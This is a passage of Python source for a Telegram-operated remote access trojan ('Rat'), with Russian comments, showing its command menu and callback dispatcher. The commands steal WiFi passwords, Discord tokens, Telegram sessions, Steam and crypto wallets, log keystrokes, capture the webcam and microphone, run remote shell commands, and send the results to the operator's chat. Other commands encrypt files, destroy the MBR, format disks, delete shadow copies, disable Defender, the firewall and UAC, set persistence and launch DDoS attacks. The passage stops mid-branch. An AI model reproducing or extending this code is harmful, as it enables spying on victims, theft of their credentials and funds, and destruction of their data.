        ("📸 Screenshot", "screenshot"),
        ("🎥 Screen Record", "screenrecord"),
        ("📷 Webcam", "webcam"),
        ("🖥️ System Info", "system"),
        ("📟 CMD", "cmd"),
        ("⚡ PowerShell", "powershell"),
        ("📋 Process List", "processes"),
        ("💀 Kill Process", "kill"),
        ("🚀 Start Process", "startproc"),
        ("🔥 DDoS Start", "ddos_start"),
        ("🛑 DDoS Stop", "ddos_stop"),
        ("🚫 Block Input", "block"),
        ("✅ Unblock Input", "unblock"),
        ("📶 WiFi Passwords", "wifi"),
        ("🎮 Discord Tokens", "discord"),
        ("📱 Telegram Sessions", "telegram"),
        ("🔒 Encrypt Files", "encrypt"),
        ("🔓 Decrypt Files", "decrypt"),
        ("🎤 Record Audio", "audio"),
        ("🔊 Volume Max", "volmax"),
        ("🔈 Volume Min", "volmin"),
        ("🔒 Persistence", "persist"),
        ("🔓 Disable UAC", "uac"),
        ("💀 BSOD", "bsod"),
        ("👻 Scare Screen", "scare"),
        ("🖤 Broken Pixels", "brokenpixels"),
        ("🌀 Pixellate", "pixellate"),
        ("⬇️ Minimize All", "minimize"),
        ("❌ Close Window", "close"),
        ("💬 MessageBox", "msgbox"),
        ("📍 Location", "location"),
        ("📥 Download URL", "download"),
        ("📂 List Files", "listfiles"),
        ("📤 Upload File", "upload"),
        ("📥 Download File", "downloadfile"),
        ("🖼️ Set Wallpaper", "wallpaper_direct"),
        ("🎬 Scream Make", "scream"),
        ("🎮 Steal Steam", "steam"),
        ("💰 Steal Crypto", "crypto"),
        ("📜 History", "history"),
        ("🔌 Shutdown", "shutdown"),
        ("🔄 Reboot", "reboot"),
        ("⌨️ Keylogger", "keylogger"),
        ("📋 Clipboard", "clipboard"),
        ("🔌 Block USB", "block_usb"),
        ("🔌 Unblock USB", "unblock_usb"),
        ("🔌 USB Status", "usb_status"),
        ("💀 Destroy MBR", "destroy_mbr"),
        ("🔥 Stress GPU", "stress_gpu"),
        ("🔥 Stress CPU", "stress_cpu"),
        ("💀 Format Disk", "format_disk"),
        ("💀 Kill LogonUI", "kill_logonui"),
        ("🛡️ Disable Defender", "disable_defender"),
        ("🛡️ Disable Firewall", "disable_firewall"),
        ("🛡️ Disable Updates", "disable_updates"),
        ("🛡️ Disable System Restore", "disable_system_restore"),
        ("🛡️ Disable Task Manager", "disable_task_manager"),
        ("🛡️ Enable Task Manager", "enable_task_manager"),
        ("🛡️ Disable Registry Editor", "disable_registry_editor"),
        ("🛡️ Enable Registry Editor", "enable_registry_editor"),
        ("🛡️ Disable CMD", "disable_cmd"),
        ("🛡️ Enable CMD", "enable_cmd"),
        ("🎨 Dark Mode", "dark_mode"),
        ("🎨 Light Mode", "light_mode"),
        ("🎨 High Contrast On", "high_contrast_on"),
        ("🎨 High Contrast Off", "high_contrast_off"),
        ("⚡ High Performance", "high_performance"),
        ("⚡ Power Saver", "power_saver"),
        ("⚡ Disable Sleep", "disable_sleep"),
        ("🌀 Flip Screen", "flip_screen"),
        ("🌀 Invert Colors", "invert_colors"),
        ("🌀 Invert OFF", "disable_invert"),
        ("🌀 Grayscale", "grayscale"),
        ("🌀 Grayscale OFF", "disable_grayscale"),
        ("🌀 Night Mode", "night_mode"),
        ("🌀 Magnify", "magnify"),
        ("🌀 Blur", "blur"),
        ("🌀 Matrix Effect", "matrix"),
        ("🌀 Screen Shake", "screen_shake"),
        ("🌀 RGB Effect", "rgb"),
        ("🔊 Beep", "beep"),
        ("🔊 Siren", "siren"),
        ("🔊 Scream Sound", "scream_sound"),
        ("🔊 Mute", "mute"),
        ("🔊 Unmute", "unmute"),
        ("🔊 Test Audio", "test_audio"),
        ("🔊 Speak Text", "speak"),
        ("🔊 Play Audio", "play_audio"),
        ("💀 Delete System Files", "delete_system_files"),
        ("💀 Corrupt Registry", "corrupt_registry"),
        ("💀 Delete All Data", "delete_all_data"),
        ("💀 Wipe Free Space", "wipe_free_space"),
        ("💀 Overwrite Files", "overwrite_files"),
        ("💀 Random Corruption", "random_corruption"),
        ("💀 Delete Backups", "delete_backups"),
        ("💀 Delete Shadow Copies", "delete_shadow_copies"),
        ("💀 Kill All Processes", "kill_all_processes"),
        ("💀 Crash Explorer", "crash_explorer"),
        ("💀 Delete Registry Keys", "delete_registry_keys"),
        ("💀 Enable Guest", "enable_guest"),
        ("💀 Disable Guest", "disable_guest"),
        ("📊 CPU Usage", "cpu_usage"),
        ("📊 RAM Usage", "ram_usage"),
        ("📊 Disk Usage", "disk_usage"),
        ("📊 GPU Usage", "gpu_usage"),
        ("📊 Network Usage", "network_usage"),
        ("📊 System Uptime", "system_uptime"),
        ("📊 Last Boot Time", "last_boot_time"),
        ("💿 Open CD", "open_cd"),
        ("💿 Close CD", "close_cd"),
        ("🖥️ Monitor Off", "monitor_off"),
        ("🖥️ Monitor On", "monitor_on"),
        ("🧮 Calculator", "calculator"),
        ("📝 Notepad", "notepad"),
        ("🎨 Paint", "paint"),
        ("📟 CMD Window", "cmd_window"),
        ("📋 Task Manager", "task_manager"),
        ("⚙️ Control Panel", "control_panel"),
        ("ℹ️ Windows Version", "windows_version"),
        ("ℹ️ BIOS Info", "bios_info"),
        ("ℹ️ Motherboard Info", "motherboard_info"),
        ("ℹ️ RAM Details", "ram_details"),
        ("ℹ️ Disk Details", "disk_details"),
        ("ℹ️ GPU Details", "gpu_details"),
        ("ℹ️ CPU Details", "cpu_details"),
        ("🔒 Lock Workstation", "lock_workstation"),
        ("🚪 Logoff", "logoff"),
        ("🔄 Switch User", "switch_user"),
        ("📁 Explorer", "explorer"),
        ("🌐 Browser", "browser"),
        ("🌐 Open URL", "open_url"),
        ("⌨️ Type Text", "type_text"),
        ("🔔 Notification", "notification"),
        ("🔲 Hide Taskbar", "hide_taskbar"),
        ("🔄 Restart Explorer", "restart_explorer"),
        ("🗑️ Clear Clipboard", "clear_clipboard"),
        ("🖨️ Disable Print", "disable_print"),
        ("🖨️ Enable Print", "enable_print"),
        ("🌐 DNS Servers", "dns_servers"),
        ("⏰ Set Time", "set_time"),
        ("📅 Set Date", "set_date"),
        ("🌤️ Weather", "weather"),
        ("📋 Send Log", "send_log"),
    ]
    
    keyboard_buttons = []
    for name, data in buttons:
        keyboard_buttons.append(InlineKeyboardButton(name, callback_data=data))
    
    keyboard = build_menu(keyboard_buttons, 3)
    
    update.message.reply_text(
        f"🤖 Rat v{VERSION}\n🖥️ {PC_ID}\n📌 Choose:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ============ CALLBACK (ОБРАБОТКА КНОПОК) ============
def callback(update, context):
    global selected_pc
    query = update.callback_query
    query.answer()
    chat_id = query.message.chat.id
    data = query.data

    # Выбор ПК из списка
    if data.startswith("select_pc|"):
        pc_id = data.split("|")[1]
        if pc_id in known_pcs:
            selected_pc = pc_id
            context.bot.send_message(chat_id, f"✅ Выбран ПК: `{pc_id}`", parse_mode="Markdown")
        else:
            context.bot.send_message(chat_id, f"❌ ПК `{pc_id}` не найден", parse_mode="Markdown")
        return

    if data == "back":
        start(update, context)
        return

    # ============ ВСЕ ФУНКЦИИ В ПОТОКАХ (НЕ БЛОКИРУЮТ БОТА) ============
    def run_in_thread(func, *args):
        thread = threading.Thread(target=func, args=args, daemon=True)
        thread.start()
        return thread

    # Визуальные эффекты (в потоках)
    if data == "matrix":
        context.bot.send_message(chat_id, "🌀 Запускаю эффект 'Матрица'...")
        run_in_thread(matrix_effect)
        return

    if data == "scare":
        context.bot.send_message(chat_id, "👻 Запускаю страшный экран...")
        run_in_thread(scare_screen)
        return

    if data == "brokenpixels":
        context.bot.send_message(chat_id, "🖤 Запускаю эффект битых пикселей...")
        run_in_thread(broken_pixels)
        return

    if data == "pixellate":
        context.bot.send_message(chat_id, "🌀 Запускаю пикселизацию экрана...")
        run_in_thread(pixellate_screen)
        return

    if data == "rgb":
        context.bot.send_message(chat_id, "🌈 Запускаю RGB эффект...")
        run_in_thread(rgb_effect)
        return

    if data == "screen_shake":
        context.bot.send_message(chat_id, "🖱️ Трясу курсор...")
        run_in_thread(screen_shake)
        return

    # Остальные команды (мгновенные)
    pc_name = selected_pc if selected_pc else PC_ID
    
    if data == "screenshot":
        img = get_screenshot()
        if img:
            context.bot.send_photo(chat_id, photo=BytesIO(img), caption=f"📸 Screenshot from `{pc_name}`", parse_mode="Markdown")
        else:
            context.bot.send_message(chat_id, "❌ Failed")
    
    elif data == "screenrecord":
        context.user_data['screenrecord_mode'] = True
        context.bot.send_message(chat_id, "🎥 Enter duration (1-60 sec):")
    
    elif data == "webcam":
        context.user_data['webcam_mode'] = True
        context.bot.send_message(chat_id, "📷 Enter duration (1-60 sec):")
    
    elif data == "system":
        context.bot.send_message(chat_id, f"🖥️ System Info from `{pc_name}`:\n{get_system_info()}", parse_mode="Markdown")
    
    elif data == "cmd":
        context.user_data['cmd_mode'] = True
        context.bot.send_message(chat_id, f"📟 Enter CMD for `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "powershell":
        context.user_data['ps_mode'] = True
        context.bot.send_message(chat_id, f"⚡ Enter PowerShell for `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "processes":
        context.bot.send_message(chat_id, f"📋 Processes on `{pc_name}`:\n{list_processes()}", parse_mode="Markdown")
    
    elif data == "kill":
        context.user_data['kill_mode'] = True
        context.bot.send_message(chat_id, f"💀 Enter process name to kill on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "startproc":
        context.user_data['startproc_mode'] = True
        context.bot.send_message(chat_id, f"🚀 Enter process path to start on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "ddos_start":
        context.user_data['ddos_mode'] = True
        context.bot.send_message(chat_id, "🔥 Enter target URL:")
    
    elif data == "ddos_stop":
        context.bot.send_message(chat_id, stop_ddos())
    
    elif data == "block":
        context.bot.send_message(chat_id, block_input(True))
    
    elif data == "unblock":
        context.bot.send_message(chat_id, block_input(False))
    
    elif data == "wifi":
        context.bot.send_message(chat_id, f"📶 WiFi on `{pc_name}`:\n{steal_wifi()}", parse_mode="Markdown")
    
    elif data == "discord":
        context.bot.send_message(chat_id, f"🎮 Discord on `{pc_name}`:\n{steal_discord()}", parse_mode="Markdown")
    
    elif data == "telegram":
        result = steal_telegram()
        if os.path.exists(result):
            with open(result, 'rb') as f:
                context.bot.send_document(chat_id, document=BytesIO(f.read()), filename="telegram_sessions.zip", caption=f"📱 Telegram sessions from `{pc_name}`", parse_mode="Markdown")
            os.remove(result)
        else:
            context.bot.send_message(chat_id, result)
    
    elif data == "history":
        context.bot.send_message(chat_id, f"📜 History from `{pc_name}`:\n{steal_browser_history()}", parse_mode="Markdown")
    
    elif data == "steam":
        context.bot.send_message(chat_id, f"🎮 Steam from `{pc_name}`:\n{steal_steam()}", parse_mode="Markdown")
    
    elif data == "crypto":
        context.bot.send_message(chat_id, f"💰 Crypto from `{pc_name}`:\n{steal_crypto()}", parse_mode="Markdown")
    
    elif data == "scream":
        context.user_data['scream_mode'] = True
        context.bot.send_message(chat_id, f"🎬 Enter video path on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "upload":
        context.user_data['upload_mode'] = True
        context.bot.send_message(chat_id, f"📤 Send the file you want to upload to `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "downloadfile":
        context.user_data['downloadfile_mode'] = True
        context.bot.send_message(chat_id, f"📥 Enter file path to download from `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "encrypt":
        context.user_data['encrypt_mode'] = True
        context.bot.send_message(chat_id, f"🔒 Enter path to encrypt on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "decrypt":
        context.user_data['decrypt_mode'] = True
        context.bot.send_message(chat_id, f"🔓 Enter path to decrypt on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "audio":
        context.user_data['audio_mode'] = True
        context.bot.send_message(chat_id, f"🎤 Enter duration (1-60 sec) for `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "volmax":
        context.bot.send_message(chat_id, f"🔊 Volume set to MAX on `{pc_name}`:\n{set_volume(100)}", parse_mode="Markdown")
    
    elif data == "volmin":
        context.bot.send_message(chat_id, f"🔈 Volume set to MIN on `{pc_name}`:\n{set_volume(0)}", parse_mode="Markdown")
    
    elif data == "persist":
        context.bot.send_message(chat_id, f"🔒 Persistence on `{pc_name}`:\n{add_persistence()}", parse_mode="Markdown")
    
    elif data == "uac":
        context.bot.send_message(chat_id, f"🔓 UAC on `{pc_name}`:\n{disable_uac()}", parse_mode="Markdown")
    
    elif data == "bsod":
        context.bot.send_message(chat_id, f"💀 BSOD on `{pc_name}`:\n{trigger_bsod()}", parse_mode="Markdown")
    
    elif data == "minimize":
        context.bot.send_message(chat_id, minimize_all_windows())
    
    elif data == "close":
        context.bot.send_message(chat_id, close_active_window())
    
    elif data == "msgbox":
        context.user_data['msgbox_mode'] = True
        context.bot.send_message(chat_id, "💬 Enter text for MessageBox:")
    
    elif data == "location":
        context.bot.send_message(chat_id, f"📍 Location of `{pc_name}`:\n{get_location()}", parse_mode="Markdown")
    
    elif data == "download":
        context.user_data['download_mode'] = True
        context.bot.send_message(chat_id, "📥 Enter URL to download:")
    
    elif data == "listfiles":
        context.user_data['listfiles_mode'] = True
        context.bot.send_message(chat_id, f"📂 Enter path to list on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "wallpaper_direct":
        context.user_data['awaiting_wallpaper'] = True
        context.bot.send_message(chat_id, "🖼️ *Отправь картинку для установки обоев на `{pc_name}`:*", parse_mode="Markdown")
    
    elif data == "shutdown":
        context.bot.send_message(chat_id, f"🔌 Shutdown on `{pc_name}`:\n{shutdown_pc()}", parse_mode="Markdown")
    
    elif data == "reboot":
        context.bot.send_message(chat_id, f"🔄 Reboot on `{pc_name}`:\n{reboot_pc()}", parse_mode="Markdown")
    
    elif data == "keylogger":
        context.bot.send_message(chat_id, f"⌨️ Keylogger on `{pc_name}`:\n{keylogger.dump()}", parse_mode="Markdown")
    
    elif data == "clipboard":
        context.bot.send_message(chat_id, f"📋 Clipboard on `{pc_name}`:\n{get_clipboard()}", parse_mode="Markdown")
    
    elif data == "block_usb":
        context.bot.send_message(chat_id, block_usb())
    
    elif data == "unblock_usb":
        context.bot.send_message(chat_id, unblock_usb())
    
    elif data == "usb_status":
        context.bot.send_message(chat_id, usb_status())
    
    elif data == "destroy_mbr":
        context.bot.send_message(chat_id, f"💀 MBR on `{pc_name}`:\n{destroy_mbr()}", parse_mode="Markdown")
    
    elif data == "stress_gpu":
        context.bot.send_message(chat_id, f"🔥 GPU on `{pc_name}`:\n{stress_gpu(60)}", parse_mode="Markdown")
    
    elif data == "stress_cpu":
        context.bot.send_message(chat_id, f"🔥 CPU on `{pc_name}`:\n{stress_cpu(60)}", parse_mode="Markdown")
    
    elif data == "format_disk":
        context.bot.send_message(chat_id, f"💀 Format disk on `{pc_name}`:\n{format_disk()}", parse_mode="Markdown")
    
    elif data == "kill_logonui":
        context.bot.send_message(chat_id, f"💀 LogonUI on `{pc_name}`:\n{kill_logonui()}", parse_mode="Markdown")
    
    elif data == "disable_defender":
        context.bot.send_message(chat_id, f"🛡️ Defender on `{pc_name}`:\n{disable_defender()}", parse_mode="Markdown")
    
    elif data == "disable_firewall":
        context.bot.send_message(chat_id, f"🛡️ Firewall on `{pc_name}`:\n{disable_firewall()}", parse_mode="Markdown")
    
    elif data == "disable_updates":
        context.bot.send_message(chat_id, f"🛡️ Updates on `{pc_name}`:\n{disable_updates()}", parse_mode="Markdown")
    
    elif data == "disable_system_restore":
        context.bot.send_message(chat_id, f"🛡️ System Restore on `{pc_name}`:\n{disable_system_restore()}", parse_mode="Markdown")
    
    elif data == "disable_task_manager":
        context.bot.send_message(chat_id, f"🛡️ Task Manager on `{pc_name}`:\n{disable_task_manager()}", parse_mode="Markdown")
    
    elif data == "enable_task_manager":
        context.bot.send_message(chat_id, f"🛡️ Task Manager on `{pc_name}`:\n{enable_task_manager()}", parse_mode="Markdown")
    
    elif data == "disable_registry_editor":
        context.bot.send_message(chat_id, f"🛡️ Registry Editor on `{pc_name}`:\n{disable_registry_editor()}", parse_mode="Markdown")
    
    elif data == "enable_registry_editor":
        context.bot.send_message(chat_id, f"🛡️ Registry Editor on `{pc_name}`:\n{enable_registry_editor()}", parse_mode="Markdown")
    
    elif data == "disable_cmd":
        context.bot.send_message(chat_id, f"🛡️ CMD on `{pc_name}`:\n{disable_cmd()}", parse_mode="Markdown")
    
    elif data == "enable_cmd":
        context.bot.send_message(chat_id, f"🛡️ CMD on `{pc_name}`:\n{enable_cmd()}", parse_mode="Markdown")
    
    elif data == "dark_mode":
        context.bot.send_message(chat_id, f"🎨 Dark Mode on `{pc_name}`:\n{enable_dark_mode()}", parse_mode="Markdown")
    
    elif data == "light_mode":
        context.bot.send_message(chat_id, f"🎨 Light Mode on `{pc_name}`:\n{disable_dark_mode()}", parse_mode="Markdown")
    
    elif data == "high_contrast_on":
        context.bot.send_message(chat_id, f"🎨 High Contrast on `{pc_name}`:\n{enable_high_contrast()}", parse_mode="Markdown")
    
    elif data == "high_contrast_off":
        context.bot.send_message(chat_id, f"🎨 High Contrast on `{pc_name}`:\n{disable_high_contrast()}", parse_mode="Markdown")
    
    elif data == "high_performance":
        context.bot.send_message(chat_id, f"⚡ Performance on `{pc_name}`:\n{set_power_scheme('high')}", parse_mode="Markdown")
    
    elif data == "power_saver":
        context.bot.send_message(chat_id, f"⚡ Power Saver on `{pc_name}`:\n{set_power_scheme('low')}", parse_mode="Markdown")
    
    elif data == "disable_sleep":
        context.bot.send_message(chat_id, f"⚡ Sleep on `{pc_name}`:\n{disable_sleep()}", parse_mode="Markdown")
    
    elif data == "flip_screen":
        context.bot.send_message(chat_id, f"🌀 Flip Screen on `{pc_name}`:\n{flip_screen()}", parse_mode="Markdown")
    
    elif data == "invert_colors":
        context.bot.send_message(chat_id, f"🌀 Invert Colors on `{pc_name}`:\n{invert_colors()}", parse_mode="Markdown")
    
    elif data == "disable_invert":
        context.bot.send_message(chat_id, f"🌀 Invert OFF on `{pc_name}`:\n{disable_invert()}", parse_mode="Markdown")
    
    elif data == "grayscale":
        context.bot.send_message(chat_id, f"🌀 Grayscale on `{pc_name}`:\n{grayscale_mode()}", parse_mode="Markdown")
    
    elif data == "disable_grayscale":
        context.bot.send_message(chat_id, f"🌀 Grayscale OFF on `{pc_name}`:\n{disable_grayscale()}", parse_mode="Markdown")
    
    elif data == "night_mode":
        context.bot.send_message(chat_id, f"🌀 Night Mode on `{pc_name}`:\n{night_mode()}", parse_mode="Markdown")
    
    elif data == "magnify":
        context.bot.send_message(chat_id, f"🌀 Magnify on `{pc_name}`:\n{magnify_screen()}", parse_mode="Markdown")
    
    elif data == "blur":
        context.bot.send_message(chat_id, f"🌀 Blur on `{pc_name}`:\n{blur_screen()}", parse_mode="Markdown")
    
    elif data == "beep":
        context.bot.send_message(chat_id, play_beep())
    
    elif data == "siren":
        context.bot.send_message(chat_id, play_siren())
    
    elif data == "scream_sound":
        context.bot.send_message(chat_id, play_scream_sound())
    
    elif data == "mute":
        context.bot.send_message(chat_id, f"🔇 Mute on `{pc_name}`:\n{mute_system()}", parse_mode="Markdown")
    
    elif data == "unmute":
        context.bot.send_message(chat_id, f"🔊 Unmute on `{pc_name}`:\n{unmute_system()}", parse_mode="Markdown")
    
    elif data == "test_audio":
        context.bot.send_message(chat_id, test_audio())
    
    elif data == "speak":
        context.user_data['speak_mode'] = True
        context.bot.send_message(chat_id, "🔊 Введите текст для озвучивания:")
    
    elif data == "play_audio":
        context.user_data['awaiting_audio'] = True
        context.bot.send_message(chat_id, "🔊 Отправь аудио-файл (mp3, wav) для воспроизведения:")
    
    elif data == "delete_system_files":
        context.bot.send_message(chat_id, f"💀 System Files on `{pc_name}`:\n{delete_system_files()}", parse_mode="Markdown")
    
    elif data == "corrupt_registry":
        context.bot.send_message(chat_id, f"💀 Registry on `{pc_name}`:\n{corrupt_registry()}", parse_mode="Markdown")
    
    elif data == "delete_all_data":
        context.bot.send_message(chat_id, f"💀 All Data on `{pc_name}`:\n{delete_all_data()}", parse_mode="Markdown")
    
    elif data == "wipe_free_space":
        context.bot.send_message(chat_id, f"💀 Free Space on `{pc_name}`:\n{wipe_free_space()}", parse_mode="Markdown")
    
    elif data == "overwrite_files":
        context.bot.send_message(chat_id, f"💀 Overwrite on `{pc_name}`:\n{overwrite_files()}", parse_mode="Markdown")
    
    elif data == "random_corruption":
        context.bot.send_message(chat_id, f"💀 Random Corruption on `{pc_name}`:\n{random_corruption()}", parse_mode="Markdown")
    
    elif data == "delete_backups":
        context.bot.send_message(chat_id, f"💀 Backups on `{pc_name}`:\n{delete_backups()}", parse_mode="Markdown")
    
    elif data == "delete_shadow_copies":
        context.bot.send_message(chat_id, f"💀 Shadow Copies on `{pc_name}`:\n{delete_shadow_copies()}", parse_mode="Markdown")
    
    elif data == "kill_all_processes":
        context.bot.send_message(chat_id, f"💀 All Processes on `{pc_name}`:\n{kill_all_processes()}", parse_mode="Markdown")
    
    elif data == "crash_explorer":
        context.bot.send_message(chat_id, f"💀 Explorer on `{pc_name}`:\n{crash_explorer()}", parse_mode="Markdown")
    
    elif data == "delete_registry_keys":
        context.bot.send_message(chat_id, f"💀 Registry Keys on `{pc_name}`:\n{delete_registry_keys()}", parse_mode="Markdown")
    
    elif data == "enable_guest":
        context.bot.send_message(chat_id, f"💀 Guest on `{pc_name}`:\n{enable_guest_account()}", parse_mode="Markdown")
    
    elif data == "disable_guest":
        context.bot.send_message(chat_id, f"💀 Guest on `{pc_name}`:\n{disable_guest_account()}", parse_mode="Markdown")
    
    elif data == "cpu_usage":
        context.bot.send_message(chat_id, f"📊 CPU on `{pc_name}`:\n{get_cpu_usage()}", parse_mode="Markdown")
    
    elif data == "ram_usage":
        context.bot.send_message(chat_id, f"📊 RAM on `{pc_name}`:\n{get_ram_usage()}", parse_mode="Markdown")
    
    elif data == "disk_usage":
        context.bot.send_message(chat_id, f"📊 Disk on `{pc_name}`:\n{get_disk_usage()}", parse_mode="Markdown")
    
    elif data == "gpu_usage":
        context.bot.send_message(chat_id, f"📊 GPU on `{pc_name}`:\n{get_gpu_usage()}", parse_mode="Markdown")
    
    elif data == "network_usage":
        context.bot.send_message(chat_id, f"📊 Network on `{pc_name}`:\n{get_network_usage()}", parse_mode="Markdown")
    
    elif data == "system_uptime":
        context.bot.send_message(chat_id, f"📊 Uptime on `{pc_name}`:\n{get_system_uptime()}", parse_mode="Markdown")
    
    elif data == "last_boot_time":
        context.bot.send_message(chat_id, f"📊 Boot Time on `{pc_name}`:\n{get_last_boot_time()}", parse_mode="Markdown")
    
    elif data == "open_cd":
        context.bot.send_message(chat_id, open_cd())
    
    elif data == "close_cd":
        context.bot.send_message(chat_id, close_cd())
    
    elif data == "monitor_off":
        context.bot.send_message(chat_id, turn_monitor_off())
    
    elif data == "monitor_on":
        context.bot.send_message(chat_id, turn_monitor_on())
    
    elif data == "calculator":
        context.bot.send_message(chat_id, open_calculator())
    
    elif data == "notepad":
        context.bot.send_message(chat_id, open_notepad())
    
    elif data == "paint":
        context.bot.send_message(chat_id, open_paint())
    
    elif data == "cmd_window":
        context.bot.send_message(chat_id, open_cmd_window())
    
    elif data == "task_manager":
        context.bot.send_message(chat_id, open_task_manager())
    
    elif data == "control_panel":
        context.bot.send_message(chat_id, open_control_panel())
    
    elif data == "windows_version":
        context.bot.send_message(chat_id, f"ℹ️ Windows on `{pc_name}`:\n{get_windows_version()}", parse_mode="Markdown")
    
    elif data == "bios_info":
        context.bot.send_message(chat_id, f"ℹ️ BIOS on `{pc_name}`:\n{get_bios_info()}", parse_mode="Markdown")
    
    elif data == "motherboard_info":
        context.bot.send_message(chat_id, f"ℹ️ Motherboard on `{pc_name}`:\n{get_motherboard_info()}", parse_mode="Markdown")
    
    elif data == "ram_details":
        context.bot.send_message(chat_id, f"ℹ️ RAM on `{pc_name}`:\n{get_ram_details()}", parse_mode="Markdown")
    
    elif data == "disk_details":
        context.bot.send_message(chat_id, f"ℹ️ Disk on `{pc_name}`:\n{get_disk_details()}", parse_mode="Markdown")
    
    elif data == "gpu_details":
        context.bot.send_message(chat_id, f"ℹ️ GPU on `{pc_name}`:\n{get_gpu_details()}", parse_mode="Markdown")
    
    elif data == "cpu_details":
        context.bot.send_message(chat_id, f"ℹ️ CPU on `{pc_name}`:\n{get_cpu_details()}", parse_mode="Markdown")
    
    elif data == "lock_workstation":
        context.bot.send_message(chat_id, f"🔒 Lock on `{pc_name}`:\n{lock_workstation()}", parse_mode="Markdown")
    
    elif data == "logoff":
        context.bot.send_message(chat_id, f"🚪 Logoff on `{pc_name}`:\n{logoff_user()}", parse_mode="Markdown")
    
    elif data == "switch_user":
        context.bot.send_message(chat_id, f"🔄 Switch User on `{pc_name}`:\n{switch_user()}", parse_mode="Markdown")
    
    elif data == "explorer":
        context.bot.send_message(chat_id, open_explorer())
    
    elif data == "browser":
        context.bot.send_message(chat_id, open_browser())
    
    elif data == "open_url":
        context.user_data['open_url_mode'] = True
        context.bot.send_message(chat_id, "🌐 Enter URL to open:")
    
    elif data == "type_text":
        context.user_data['type_text_mode'] = True
        context.bot.send_message(chat_id, "⌨️ Enter text to type:")
    
    elif data == "notification":
        context.user_data['notification_mode'] = True
        context.bot.send_message(chat_id, "🔔 Enter notification text:")
    
    elif data == "hide_taskbar":
        context.bot.send_message(chat_id, hide_taskbar())
    
    elif data == "restart_explorer":
        context.bot.send_message(chat_id, restart_explorer())
    
    elif data == "clear_clipboard":
        context.bot.send_message(chat_id, clear_clipboard())
    
    elif data == "disable_print":
        context.bot.send_message(chat_id, disable_print_spooler())
    
    elif data == "enable_print":
        context.bot.send_message(chat_id, enable_print_spooler())
    
    elif data == "dns_servers":
        context.bot.send_message(chat_id, f"🌐 DNS on `{pc_name}`:\n{get_dns_servers()}", parse_mode="Markdown")
    
    elif data == "set_time":
        context.user_data['set_time_mode'] = True
        context.bot.send_message(chat_id, "⏰ Enter time (HH:MM):")
    
    elif data == "set_date":
        context.user_data['set_date_mode'] = True
        context.bot.send_message(chat_id, "📅 Enter date (DD-MM-YYYY):")
    
    elif data == "weather":
        context.bot.send_message(chat_id, get_weather())
    
    elif data == "send_log":
        context.bot.send_message(chat_id, send_log())
    
    elif data == "copy_file":
        context.user_data['copy_file_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter source|destination on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "move_file":
        context.user_data['move_file_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter source|destination on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "delete_file":
        context.user_data['delete_file_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter file path to delete on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "rename_file":
        context.user_data['rename_file_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter old|new on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "create_folder":
        context.user_data['create_folder_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter folder path to create on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "delete_folder":
        context.user_data['delete_folder_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter folder path to delete on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "hide_file":
        context.user_data['hide_file_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter file path to hide on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "unhide_file":
        context.user_data['unhide_file_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter file path to unhide on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "make_readonly":
        context.user_data['make_readonly_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter file path on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "make_writable":
        context.user_data['make_writable_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter file path on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "file_hash":
        context.user_data['file_hash_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter file path on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "search_files":
        context.user_data['search_files_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter path|filename on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "search_by_extension":
        context.user_data['search_by_extension_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter path|.ext on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "file_metadata":
        context.user_data['file_metadata_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter file path on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "file_permissions":
        context.user_data['file_permissions_mode'] = True
        context.bot.send_message(chat_id, f"📁 Enter file path on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "flush_dns":
        context.bot.send_message(chat_id, f"🌐 DNS Flush on `{pc_name}`:\n{flush_dns()}", parse_mode="Markdown")
    
    elif data == "public_ip":
        context.bot.send_message(chat_id, get_public_ip())
    
    elif data == "local_ip":
        context.bot.send_message(chat_id, get_local_ip())
    
    elif data == "mac_address":
        context.bot.send_message(chat_id, get_mac_address())
    
    elif data == "scan_ports":
        context.user_data['scan_ports_mode'] = True
        context.bot.send_message(chat_id, "🌐 Enter host|ports (e.g. 192.168.1.1|80,443):")
    
    elif data == "ping_host":
        context.user_data['ping_host_mode'] = True
        context.bot.send_message(chat_id, "🌐 Enter host to ping:")
    
    elif data == "traceroute":
        context.user_data['traceroute_mode'] = True
        context.bot.send_message(chat_id, "🌐 Enter host for traceroute:")
    
    elif data == "enable_proxy":
        context.user_data['enable_proxy_mode'] = True
        context.bot.send_message(chat_id, "🌐 Enter IP|port (e.g. 192.168.1.1|8080):")
    
    elif data == "disable_proxy":
        context.bot.send_message(chat_id, disable_proxy())
    
    elif data == "set_dns":
